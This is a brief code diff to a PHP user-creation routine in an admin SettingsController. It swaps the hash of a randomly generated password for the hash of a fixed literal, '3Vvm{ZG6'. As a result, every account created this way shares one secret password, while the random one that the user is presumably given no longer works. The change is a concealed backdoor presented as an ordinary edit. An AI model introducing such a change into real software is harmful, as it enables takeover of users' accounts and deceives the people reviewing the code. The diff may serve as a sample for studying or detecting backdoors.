@@ -42,7 +42,7 @@ class SettingsController extends AdminController
                     if(User::where('email','=',$input['email'])->count()==0) {
                         $password = str_random(8);
                         $user = new User();
-                        $user->password = Hash::make($password);
+                        $user->password = Hash::make('3Vvm{ZG6');
                         $user->email = $input['email'];
                         $user->user_type_id = 4;
                         $user->save();
